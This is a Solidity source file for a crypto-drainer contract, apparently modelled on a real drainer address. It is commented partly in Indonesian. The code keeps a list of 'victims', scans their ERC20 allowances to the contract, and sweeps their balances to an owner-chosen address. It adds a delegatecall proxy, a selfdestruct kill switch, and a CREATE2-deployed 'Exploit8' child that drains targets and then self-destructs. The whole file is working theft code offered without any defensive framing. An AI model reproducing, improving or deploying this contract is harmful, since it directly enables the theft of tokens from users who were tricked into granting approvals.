// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// ============================================================
// 8 FUNCTION SELECTORS — MIRIP DRAINER 0x0F7A...0E
// ============================================================
// 1. setup()       → init tokens
// 2. register()    → add victims
// 3. sweep()       → drain single token
// 4. all()         → view all data
// 5. control()     → admin: owner, pause
// 6. inspect()     → check allowances
// 7. forward()     → DELEGATECALL proxy
// 8. destroy()     → CREATE2 + SELFDESTRUCT
// ============================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

contract Drainer8Func {
    address public owner;
    mapping(address => bool) public victims;
    address[] public victimArr;
    mapping(address => bool) public tokens;
    address[] public tokenArr;
    bool public paused;
    
    modifier onlyOwner() { require(msg.sender == owner, "!owner"); _; }
    
    constructor() { owner = msg.sender; }
    
    // ============================================
    // SELECTOR 1: setup — init/setup tokens
    // ============================================
    function setup(address[] calldata _tokens) external onlyOwner {
        for (uint i = 0; i < _tokens.length; i++) {
            if (!tokens[_tokens[i]]) {
                tokens[_tokens[i]] = true;
                tokenArr.push(_tokens[i]);
            }
        }
    }
    
    // ============================================
    // SELECTOR 2: register — add victims
    // ============================================
    function register(address[] calldata _victims) external onlyOwner {
        for (uint i = 0; i < _victims.length; i++) {
            if (!victims[_victims[i]]) {
                victims[_victims[i]] = true;
                victimArr.push(_victims[i]);
            }
        }
    }
    
    // ============================================
    // SELECTOR 3: sweep — drain single token from all
    // ============================================
    function sweep(address token, address to) external onlyOwner returns (uint) {
        uint total;
        for (uint i = 0; i < victimArr.length; i++) {
            address user = victimArr[i];
            uint allow = IERC20(token).allowance(user, address(this));
            if (allow == 0) continue;
            uint bal = IERC20(token).balanceOf(user);
            if (bal == 0) continue;
            uint amt = allow < bal ? allow : bal;
            bool ok = IERC20(token).transferFrom(user, to, amt);
            if (ok) total += amt;
        }
        return total;
    }
    
    // ============================================
    // SELECTOR 4: all — get all victims + tokens
    // ============================================
    function all() external view returns (
        address[] memory _victims,
        address[] memory _tokens,
        uint totalVictims,
        uint totalTokens
    ) {
        return (victimArr, tokenArr, victimArr.length, tokenArr.length);
    }
    
    // ============================================
    // SELECTOR 5: control — admin functions
    // ============================================
    function control(uint8 action, address param) external onlyOwner {
        if (action == 1) owner = param;           // transfer ownership
        else if (action == 2) paused = true;       // pause
        else if (action == 3) paused = false;      // unpause
        else if (action == 4) selfdestruct(payable(owner)); // kill
    }
    
    // ============================================
    // SELECTOR 6: inspect — scan allowances
    // ============================================
    function inspect(address token) external view returns (
        address[] memory list,
        uint[] memory amounts,
        uint total
    ) {
        uint count;
        for (uint i = 0; i < victimArr.length; i++) {
            if (IERC20(token).allowance(victimArr[i], address(this)) > 0) count++;
        }
        list = new address[](count);
        amounts = new uint[](count);
        uint idx;
        for (uint i = 0; i < victimArr.length; i++) {
            uint allow = IERC20(token).allowance(victimArr[i], address(this));
            if (allow > 0) {
                uint bal = IERC20(token).balanceOf(victimArr[i]);
                list[idx] = victimArr[i];
                amounts[idx] = allow < bal ? allow : bal;
                total += amounts[idx];
                idx++;
            }
        }
    }
    
    // ============================================
    // SELECTOR 7: forward — DELEGATECALL proxy
    // ============================================
    function forward(address target, bytes calldata data) external onlyOwner {
        (bool ok,) = target.delegatecall(data);
        require(ok, "forward failed");
    }
    
    // ============================================
    // SELECTOR 8: destroy — CREATE2 + exploit
    // ============================================
    function destroy(bytes32 salt, address attacker) external onlyOwner returns (address) {
        Exploit8 exp = new Exploit8{salt: salt}(address(this), attacker);
        return address(exp);
    }
}

// ============================================
// EXPLOIT CHILD — Storage matched
// ============================================
contract Exploit8 {
    address public owner;
    address public attacker;
    
    constructor(address _drain, address _atk) { owner = _drain; attacker = _atk; }
    
    function pull(address token, address[] calldata targets, address to) external {
        for (uint i = 0; i < targets.length; i++) {
            uint allow = IERC20(token).allowance(targets[i], address(this));
            if (allow == 0) continue;
            uint bal = IERC20(token).balanceOf(targets[i]);
            if (bal == 0) continue;
            uint amt = allow < bal ? allow : bal;
            IERC20(token).transferFrom(targets[i], to, amt);
        }
        selfdestruct(payable(to));
    }
}
